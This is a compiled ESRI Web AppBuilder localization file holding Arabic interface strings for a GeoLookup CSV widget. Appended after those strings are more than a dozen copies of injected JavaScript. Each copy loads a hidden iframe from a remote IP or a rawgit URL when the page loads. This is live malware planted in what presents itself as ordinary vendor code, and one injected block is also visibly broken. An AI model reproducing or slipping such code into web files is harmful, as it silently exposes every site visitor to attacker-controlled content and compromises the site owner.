// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GeoLookup/nls/strings":{_widgetLabel:"\u0627\u0644\u0628\u062d\u062b \u0627\u0644\u062c\u063a\u0631\u0627\u0641\u064a",description:"\u0627\u0633\u062a\u0639\u0631\u0636 \u0625\u0644\u0649 \x3ca href\x3d'./widgets/GeoLookup/data/sample.csv' tooltip\x3d'Download an example sheet' target\x3d'_blank'\x3e \u062c\u062f\u0648\u0644 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \x3c/a\x3e \u0623\u0648 \u0627\u0633\u062d\u0628\u0647 \u0647\u0646\u0627 \u0644\u062a\u0635\u0648\u0651\u0631 \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u062e\u0631\u064a\u0637\u0629 \u0648\u0625\u0644\u062d\u0627\u0642\u0647\u0627 \u0628\u0647.",
selectCSV:"\u062d\u062f\u062f CSV",loadingCSV:"Loading CSV",savingCSV:"CSVExport",clearResults:"\u0645\u0633\u062d",downloadResults:"\u062a\u0646\u0632\u064a\u0644",plotOnly:"\u0646\u0642\u0627\u0637 \u0642\u0637\u0639 \u0623\u0631\u0636 \u0641\u0642\u0637",plottingRows:"\u0631\u0633\u0645 \u0635\u0641\u0648\u0641",projectionChoice:"CVS \u0641\u064a",projectionLat:"\u062e\u0637\u0648\u0637 \u0627\u0644\u0637\u0648\u0644/\u062f\u0648\u0627\u0626\u0631 \u0627\u0644\u0639\u0631\u0636",projectionMap:"\u0625\u0633\u0642\u0627\u0637 \u0627\u0644\u062e\u0631\u064a\u0637\u0629",
messages:"\u0631\u0633\u0627\u0626\u0644",error:{fetchingCSV:"\u062e\u0637\u0623 \u0641\u064a \u0625\u062d\u0636\u0627\u0631 \u0627\u0644\u0639\u0646\u0627\u0635\u0631 \u0645\u0646 \u0645\u062a\u062c\u0631 CSV: ${0}",fileIssue:"\u064a\u062a\u0639\u0630\u0631 \u0645\u0639\u0627\u0644\u062c\u0629 \u0627\u0644\u0645\u0644\u0641",notCSVFile:"\u064a\u062a\u0645 \u062f\u0639\u0645 \u0627\u0644\u0645\u0644\u0641\u0627\u062a \u0627\u0644\u0645\u062d\u062f\u062f\u0629 \u0628\u0641\u0627\u0635\u0644\u0629 (.csv) \u0641\u0642\u0637 \u062d\u0627\u0644\u064a\u064b\u0627.",
invalidCoord:"\u062d\u0642\u0648\u0644 \u0627\u0644\u0645\u0648\u0642\u0639 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629. \u064a\u0631\u062c\u0649 \u0627\u0644\u062a\u0623\u0634\u064a\u0631 \u0639\u0644\u0649 \u0645\u0644\u0641 CSV.",tooManyRecords:"\u0639\u0630\u0631\u064b\u0627\u060c \u0644\u0627 \u064a\u0648\u062c\u062f \u0623\u0643\u062b\u0631 \u0645\u0646 ${0} \u0633\u062c\u0644 \u062d\u0627\u0644\u064a\u064b\u0627.",CSVNoRecords:"\u0644\u0627 \u064a\u062d\u062a\u0648\u064a \u0627\u0644\u0645\u0644\u0641 \u0639\u0644\u0649 \u0623\u064a \u0633\u062c\u0644\u0627\u062a.",
CSVEmptyFile:"\u0644\u0627 \u064a\u0648\u062c\u062f \u0623\u064a \u0645\u062d\u062a\u0648\u0649 \u0641\u064a \u0627\u0644\u0645\u0644\u0641."},results:{csvLoaded:"\u062a\u0645 \u062a\u062d\u0645\u064a\u0644 ${0} \u0633\u062c\u0644 \u0645\u0646 \u0645\u0644\u0641 CSV",recordsPlotted:"\u064a\u0642\u0639 ${0}/${1} \u0633\u062c\u0644 \u0639\u0644\u0649 \u0627\u0644\u062e\u0631\u064a\u0637\u0629",recordsEnriched:"\u062a\u0645 \u0645\u0639\u0627\u0644\u062c\u0629 ${0}/${1} \u0648\u062a\u062d\u0633\u064a\u0646 ${2} \u0645\u0642\u0627\u0628\u0644 ${3}",
recordsError:"${0} \u0633\u062c\u0644 \u064a\u062d\u062a\u0648\u064a \u0639\u0644\u0649 \u0623\u062e\u0637\u0627\u0621",recordsErrorList:"\u062a\u0648\u062c\u062f \u0645\u0634\u0643\u0644\u0629 \u0641\u064a \u0635\u0641 ${0}",label:"\u0646\u062a\u0627\u0626\u062c CSV"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});